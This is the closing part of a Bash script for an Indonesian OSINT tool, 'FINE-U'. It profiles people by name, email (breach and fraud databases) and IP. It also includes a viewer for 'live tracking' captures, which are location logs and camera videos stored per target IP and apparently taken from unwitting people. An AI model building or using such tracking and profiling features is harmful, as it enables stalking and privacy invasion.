  if [ ! -d "$vid_dir" ] || [ -z "$(ls -A "$vid_dir" 2>/dev/null)" ]; then
    header
    printf '  %sDATA LIVE TRACKING%s\n\n  Belum ada data lokasi atau rekaman kamera yang tersimpan.\n\n' "$B" "$R"
    pause
    return
  fi

  local dirs=() d i ans notice=""
  while :; do
    header
    printf '  %sDATA TANGKAPAN LIVE TRACKING (LOKASI & KAMERA)%s\n\n' "$B" "$R"
    [ -n "$notice" ] && { printf '  %s%s%s\n\n' "$RED" "$notice" "$R"; notice=""; }
    mapfile -t dirs < <(find "$vid_dir" -mindepth 1 -maxdepth 1 -type d 2>/dev/null | sort)
    if [ "${#dirs[@]}" -eq 0 ]; then
      printf '  Semua data kosong.\n\n'; pause; return
    fi
    i=1
    for d in "${dirs[@]}"; do
      local ip_name=$(basename "$d")
      local loc_count=$(find "$d" -name "log_lokasi.txt" | wc -l)
      local vid_count=$(find "$d" -name "*.webm" | wc -l)
      printf '  %s[%d]%s Target IP: %s  %s(Log Lokasi: %d, Video Webm: %d)%s\n' \
        "$B$CYN" "$i" "$R" "$ip_name" "$D" "$loc_count" "$vid_count" "$R"
      i=$((i + 1))
    done
    printf '\n  Pilih nomor target untuk melihat isi foldernya (kosongkan untuk kembali): '
    read -r ans || exit 0
    [ -z "$ans" ] && return
    if [[ $ans =~ ^[0-9]+$ ]] && (( ans >= 1 && ans <= ${#dirs[@]} )); then
      local selected_dir="${dirs[ans-1]}"
      header
      printf '  %sISI FOLDER TARGET: %s%s\n\n' "$B" "$(basename "$selected_dir")" "$R"
      printf '  Path folder di komputer:\n  %s\n\n' "$selected_dir"
      printf '  Daftar file tangkapan:\n'
      ls -la "$selected_dir"
      printf '\n'
      pause
    else
      notice="Nomor tidak valid."
    fi
  done
}

status_screen() {
  local f lines rows; f=$(mktemp)
  { printf '  %sSTATUS SUMBER%s\n\n' "$B" "$R"; print_status; } > "$f"
  lines=$(wc -l < "$f"); rows=$(tput lines 2>/dev/null || echo 24)
  if [ -t 1 ] && [ "$lines" -gt $((rows - 6)) ] && command -v less >/dev/null; then
    LANG=C.UTF-8 less -f -R -P 'Status sumber  (panah atas/bawah untuk gulir, q untuk kembali)' "$f"
  else
    header; cat "$f"; printf '\n'; pause
  fi
  rm -f "$f"
}

# ---------- setting ----------
# kunci | label | tipe (secret|text|num|bool|choice) | pilihan | petunjuk
SET_KEY=(SEARXNG_URL TAVILY_API_KEY BRAVE_API_KEY GOOGLE_CSE_KEY GOOGLE_CSE_CX YOUTUBE_API_KEY GITHUB_TOKEN
         HIBP_API_KEY HUNTER_API_KEY ABSTRACT_API_KEY ZEROBOUNCE_API_KEY IPQS_API_KEY EMAILREP_API_KEY
         DEHASHED_API_KEY SEON_API_KEY
         SEARCH_MODE MAX_PER_SOURCE SEARXNG_LANG SOCIAL_SEARCH SOCIAL_BACKEND EMAIL_WEB_SCAN)
SET_SPLIT=15   # jumlah item "kunci & alamat API"; berikutnya "Preferensi"; lalu "Limit harian" (SET_SPLIT2)
SET_LABEL=("SearXNG (alamat URL)" "Tavily (API key)" "Brave Search (API key)" "Google CSE (API key)"
           "Google CSE (cx)" "YouTube Data API (key)" "GitHub (token)"
           "HaveIBeenPwned (key)" "Hunter (key)" "Abstract Email (key)" "ZeroBounce (key)" "IPQualityScore (key)"
           "EmailRep (key, opsional)" "DeHashed (key)" "SEON (key)"
           "Mode pencarian" "Hasil per sumber di layar" "Bahasa SearXNG" "Cari di media sosial" "Mesin web media sosial"
           "Email: cari jejak di web")
SET_TYPE=(text secret secret secret text secret secret secret secret secret secret secret secret secret secret choice num text bool choice bool)
SET_OPTS=("" "" "" "" "" "" "" "" "" "" "" "" "" "" "" "akurat seimbang luas" "" "" "" "auto searxng brave tavily cse" "")
SET_HINT=(
  "Jalankan ./setup-searxng.sh (terisi otomatis), atau isi alamat SearXNG milikmu, mis. http://127.0.0.1:8888"
  "Daftar di https://tavily.com lalu salin API key dari dashboard."
  "Daftar di https://brave.com/search/api/ (cek paket dan kuota terbaru)."
  "https://console.cloud.google.com/apis/credentials (aktifkan Custom Search API)."
  "ID mesin pencari dari https://programmablesearchengine.google.com/"
  "Google Cloud Console, aktifkan YouTube Data API v3. Tanpa ini YouTube dicari lewat mesin web."
  "https://github.com/settings/tokens (tanpa izin khusus pun cukup). Menaikkan batas pencarian GitHub."
  "akurat = hanya hasil yang memuat semua kata | seimbang = frasa persis + longgar (bawaan) | luas = ditambah variasi urutan nama, semua hasil tampil."
  "Berapa hasil per sumber yang ditampilkan di layar (1-50). Daftar lengkap tetap ada di file hasil."
  "Bahasa hasil SearXNG: all, id, en, ..."
  "Ikut cari di media sosial atau tidak."
  "auto memilih SearXNG, Brave, Tavily, lalu Google CSE yang tersedia. Google CSE kuota gratisnya kecil."
  "Cek email: kebocoran data lengkap (nama kebocoran, tanggal, jenis data). https://haveibeenpwned.com/API/Key (berbayar)."
  "Cek email: verifikasi + halaman web yang memuat email itu. https://hunter.io/api-keys"
  "Cek email: skor deliverability dan kualitas. https://www.abstractapi.com/api/email-verification-validation-api"
  "Cek email: status valid/catch-all/spamtrap, umur domain. https://www.zerobounce.net/members/apikey"
  "Cek email: skor fraud, honeypot, penyalahgunaan terbaru. https://www.ipqualityscore.com/create-account"
  "Cek email: reputasi dan profil terdeteksi. Bisa dipakai tanpa key, tapi dibatasi; key dari https://emailrep.io/key"
  "Cek email: catatan di basis data kebocoran. Hanya nama basis data dan jenis data yang ditampilkan, bukan isinya. https://dehashed.com"
  "Cek email: skor fraud dan akun yang terdaftar di puluhan platform (butuh paket SEON). https://seon.io"
  "Cek email: ikut mencari alamat itu di semua sumber umum (web, berita, kode, media sosial). Mati = lebih cepat dan hemat kuota."
)

# Item "Limit harian": satu baris per layanan berkunci (kunci LIMIT_<LAYANAN>, tipe num).
SET_SPLIT2=${#SET_KEY[@]}
for _j in "${!LIM_ID[@]}"; do
  SET_KEY+=("LIMIT_${LIM_ID[_j]^^}"); SET_LABEL+=("Limit ${LIM_NAME[_j]}"); SET_TYPE+=(num); SET_OPTS+=("")
  SET_HINT+=("Maksimal permintaan ${LIM_NAME[_j]} per hari (sesuai kuota API-mu, mis. 100). Ketik \"-\" (atau 0) untuk tanpa batas / unlimited. Hitungan reset tiap tengah malam (jam lokal).")
done
unset _j

mask_value() { # $1=nilai $2=tipe
  local v=$1
  [ -z "$v" ] && { printf '(kosong)'; return; }
  if [ "$2" = secret ]; then
    if [ ${#v} -le 8 ]; then printf '••••'; else printf '••••%s' "${v: -4}"; fi
  else printf '%s' "$v"; fi
}

default_for() {
  case "$1" in
    SEARCH_MODE) echo seimbang ;; MAX_PER_SOURCE) echo 5 ;; SEARXNG_LANG) echo all ;;
    SOCIAL_SEARCH) echo 1 ;; SOCIAL_BACKEND) echo auto ;; EMAIL_WEB_SCAN) echo 1 ;;
    LIMIT_*) echo 0 ;;
  esac
}

env_git_warning() {
  command -v git >/dev/null || return 0
  git -C "$BASE" rev-parse --is-inside-work-tree >/dev/null 2>&1 || return 0
  if git -C "$BASE" ls-files --error-unmatch .env >/dev/null 2>&1; then
    printf '  %sPERINGATAN: .env sudah terlacak Git, kunci bisa ikut ke GitHub!%s\n' "$RED" "$R"
    printf '  %sJalankan: git rm --cached .env  lalu commit. Jika sudah pernah di-push, buat ulang semua kunci.%s\n\n' "$D" "$R"
  elif ! git -C "$BASE" check-ignore -q .env 2>/dev/null; then
    printf '  %sPeringatan: .env belum ada di .gitignore. Tambahkan baris ".env" agar tidak ikut ke GitHub.%s\n\n' "$YEL" "$R"
  fi
}

SET_NOTICE=""; SET_NOTICE_OK=1

edit_setting() { # $1 = indeks
  local i=$1 k t cur new c opts ch
  k=${SET_KEY[i]}; t=${SET_TYPE[i]}; cur="${!k:-}"
  SET_NOTICE="Tidak ada perubahan."; SET_NOTICE_OK=1

  if [ "$t" = bool ]; then
    [ "${cur:-1}" = 0 ] && new=1 || new=0
    set_env "$k" "$new" || { SET_NOTICE="Gagal menulis .env."; SET_NOTICE_OK=0; return; }
    export "$k=$new"; apply_defaults
    SET_NOTICE="${SET_LABEL[i]}: $([ "$new" = 1 ] && echo aktif || echo mati)."; return
  fi

  header
  printf '  %s%s%s  %s(%s)%s\n  %s%s%s\n\n' "$B" "${SET_LABEL[i]}" "$R" "$D" "$k" "$R" "$D" "${SET_HINT[i]}" "$R"
  printf '  Nilai sekarang: %s\n\n' "$(mask_value "${cur:-$(default_for "$k")}" "$t")"

  case "$t" in
    secret)
      printf '  Tempel nilai baru (tidak tampil di layar). Enter = batal, "-" = hapus: '
      read -rs new || exit 0; printf '\n'
      new=${new//[[:space:]]/} ;;
    choice)
      read -ra opts <<< "${SET_OPTS[i]}"
      c=1; for ch in "${opts[@]}"; do printf '  %s[%d]%s %s\n' "$B$CYN" "$c" "$R" "$ch"; c=$((c + 1)); done
      printf '\n  Pilih nomor (Enter = batal): '
      read -r ch || exit 0
      if [[ $ch =~ ^[0-9]+$ ]] && (( ch >= 1 && ch <= ${#opts[@]} )); then new=${opts[ch-1]}; else new=""; fi ;;
    *)
      if [[ $k == LIMIT_* ]]; then
        printf '  Isi angka limit per hari (Enter = batal, "-" atau 0 = tanpa batas): '
      else
        printf '  Nilai baru (Enter = batal, "-" = hapus / kembali ke bawaan): '
      fi
      read -r new || exit 0
      new=${new#"${new%%[![:space:]]*}"}; new=${new%"${new##*[![:space:]]}"} ;;
  esac

  [ -z "$new" ] && return
  [ "$new" = "-" ] && new=""
  if [[ $new == *[[:cntrl:]]* ]]; then SET_NOTICE="Nilai mengandung karakter tidak valid."; SET_NOTICE_OK=0; return; fi
  case "$k" in
    SEARXNG_URL) if [ -n "$new" ] && [[ ! $new =~ ^https?://[^[:space:]]+$ ]]; then
                   SET_NOTICE="Alamat harus diawali http:// atau https://"; SET_NOTICE_OK=0; return; fi ;;
    MAX_PER_SOURCE) if [ -n "$new" ] && { [[ ! $new =~ ^[0-9]+$ ]] || (( new < 1 || new > 50 )); }; then
                   SET_NOTICE="Isi angka 1 sampai 50."; SET_NOTICE_OK=0; return; fi ;;
    LIMIT_*) if [ -n "$new" ] && { [[ ! $new =~ ^[0-9]+$ ]] || (( ${#new} > 7 )); }; then
                   SET_NOTICE="Isi angka bulat (0 = tanpa batas)."; SET_NOTICE_OK=0; return; fi ;;
    SEARXNG_LANG) if [ -n "$new" ] && [[ ! $new =~ ^(all|[a-z]{2,3}([-_][A-Za-z]{2,4})?)$ ]]; then
                   SET_NOTICE="Contoh yang valid: all, id, en, en-US"; SET_NOTICE_OK=0; return; fi ;;
  esac

  set_env "$k" "$new" || { SET_NOTICE="Gagal menulis .env."; SET_NOTICE_OK=0; return; }
  export "$k=$new"; apply_defaults
  if [ -z "$new" ] && [[ $k == LIMIT_* ]]; then SET_NOTICE="${SET_LABEL[i]} dihapus: tanpa batas (unlimited)."
  elif [ -z "$new" ]; then SET_NOTICE="${SET_LABEL[i]} dihapus."; else SET_NOTICE="${SET_LABEL[i]} tersimpan di .env."; fi
}

settings_screen() {
  local i k t v dot n=${#SET_KEY[@]} ans api lim used col
  SET_NOTICE=""
  while :; do
    header
    printf '  %sSETTING%s  %s(isi / ubah API dan preferensi, tersimpan di .env)%s\n\n' "$B" "$R" "$D" "$R"
    env_git_warning
    printf '  %sKunci & alamat API%s\n' "$B" "$R"
    for ((i = 0; i < n; i++)); do
      k=${SET_KEY[i]}; t=${SET_TYPE[i]}; v="${!k:-}"
      if [ "$i" -eq "$SET_SPLIT" ]; then printf '\n  %sPreferensi%s\n' "$B" "$R"; fi
      if [ "$i" -eq "$SET_SPLIT2" ]; then
        printf '\n  %sLimit harian%s  %s(maks. permintaan API per hari; 0 = tanpa batas)%s\n' "$B" "$R" "$D" "$R"
      fi
      if [ "$i" -lt "$SET_SPLIT" ]; then
        if [ -n "$v" ]; then dot="${GRN}●${R}"; else dot="${D}○${R}"; fi
        printf '  %s[%2d]%s %-26s %s %s\n' "$B$CYN" "$((i + 1))" "$R" "${SET_LABEL[i]}" "$dot" "$(mask_value "$v" "$t")"
      elif [ "$i" -ge "$SET_SPLIT2" ]; then
        api=${k#LIMIT_}; api=${api,,}; lim=$(quota_limit "$api"); used=$(quota_used "$api"); col=$D
        [ "$lim" -gt 0 ] && [ "$used" -ge "$lim" ] && col=$RED
        if [ "$lim" -eq 0 ]; then
          printf '  %s[%2d]%s %-26s %stanpa batas · terpakai hari ini: %d%s\n' "$B$CYN" "$((i + 1))" "$R" "${SET_LABEL[i]}" "$D" "$used" "$R"
        else
          printf '  %s[%2d]%s %-26s %s%d per hari · terpakai hari ini: %d%s\n' "$B$CYN" "$((i + 1))" "$R" "${SET_LABEL[i]}" "$col" "$lim" "$used" "$R"
        fi
      else
        [ "$t" = bool ] && { [ "${v:-1}" = 0 ] && v=mati || v=aktif; }
        printf '  %s[%2d]%s %-26s %s%s%s\n' "$B$CYN" "$((i + 1))" "$R" "${SET_LABEL[i]}" "$D" "${v:-$(default_for "$k")}" "$R"
      fi
    done
    printf '\n'
    if [ -n "$SET_NOTICE" ]; then
      if [ "$SET_NOTICE_OK" = 1 ]; then printf '  %s%s%s\n\n' "$GRN" "$SET_NOTICE" "$R"
      else printf '  %s%s%s\n\n' "$RED" "$SET_NOTICE" "$R"; fi
      SET_NOTICE=""
    fi
    printf '  Nomor yang ingin diubah (r = reset hitungan hari ini, Enter = kembali): '
    read -r ans || exit 0
    [ -z "$ans" ] && return
    if [ "$ans" = r ] || [ "$ans" = R ]; then
      quota_reset_today; SET_NOTICE="Hitungan pemakaian API hari ini direset."; SET_NOTICE_OK=1; continue
    fi
    if [[ $ans =~ ^[0-9]+$ ]] && (( ans >= 1 && ans <= n )); then
      edit_setting $((ans - 1))
    else
      SET_NOTICE="Pilihan tidak valid. Ketik angka 1 sampai $n."; SET_NOTICE_OK=0
    fi
  done
}

cleanup() {
  [ -n "$TMP" ] && rm -rf "$TMP"
  [ -n "${ETMP:-}" ] && rm -rf "$ETMP"
  stop_all 2>/dev/null
  rm -rf "$WORK_DIR" 2>/dev/null
  local _p; _p=$(jobs -p); [ -n "$_p" ] && kill $_p 2>/dev/null   # shellcheck disable=SC2086
}

usage() {
  cat <<USAGE
FINE-U $VERSION

Pemakaian:
  ./fine-u.sh                 mode interaktif (menu)
  ./fine-u.sh -q "nama"       satu kali cari tanpa menu; hasil disimpan di hasil/
  ./fine-u.sh -e "a@b.com"    satu kali cek email tanpa menu; hasil disimpan di hasil-email/
  ./fine-u.sh -i "8.8.8.8"    satu kali cek IP / domain / file header email; hasil disimpan di hasil-ip/
  ./fine-u.sh --status        daftar sumber aktif / nonaktif
  ./fine-u.sh --help          bantuan ini

API, preferensi, dan limit harian per API diatur lewat menu Setting (disimpan di .env, tidak ikut Git).
USAGE
}

check_deps() {
  local dep
  for dep in curl jq awk; do
    command -v "$dep" >/dev/null || { echo "Perlu '$dep'. Install: sudo apt install -y curl jq gawk"; exit 1; }
  done
}

cli_search() {
  QUERY=$1
  printf 'Mencari: %s\n\n' "$QUERY"
  run_scan "$QUERY"
  show_report
  SAVED=""
  if [ "$(jq -r '.total' <<< "$REPORT")" -gt 0 ]; then
    SAVED=$(save_report)
    printf '  Tersimpan: %s\n' "$SAVED"
  fi
}

main() {
  trap cleanup EXIT   # dipasang paling awal agar folder temp ikut dibersihkan di semua jalur
  quota_prune
  case "${1:-}" in
    -h|--help) usage; exit 0 ;;
    --status)  check_deps; print_status; exit 0 ;;
    -e|--email)
      shift
      [ -z "${1:-}" ] && { usage; exit 1; }
      check_deps; trap cleanup EXIT; trap 'exit 130' INT TERM
      cli_email "$1"; exit 0 ;;
    -i|--ip)
      shift
      [ -z "${1:-}" ] && { usage; exit 1; }
      check_deps; trap cleanup EXIT; trap 'exit 130' INT TERM
      cli_ip "$1"; exit 0 ;;
    -q|--query)
      shift
      [ -z "${*:-}" ] && { usage; exit 1; }
      check_deps; trap cleanup EXIT; trap 'exit 130' INT TERM
      cli_search "$*"; exit 0 ;;
  esac

  check_deps
  trap cleanup EXIT
  trap 'exit 130' INT TERM
  MAIN_NOTICE="${FINEU_RELOAD_NOTICE:-}"; unset FINEU_RELOAD_NOTICE
  while :; do
    main_menu
    case "$CHOICE" in
      1) search_session ;;
      2) email_session ;;
      3) ip_menu ;;
      h) history_session ;;
      s) status_screen ;;
      p) settings_screen ;;
      u) update_session ;;
      x) clear_screen; printf '%sSampai jumpa.%s\n' "$D" "$R"; exit 0 ;;
    esac
  done
}

# Hanya jalan jika dieksekusi langsung (bukan di-source untuk pengujian).
[[ "${BASH_SOURCE[0]}" == "$0" ]] && main "$@"
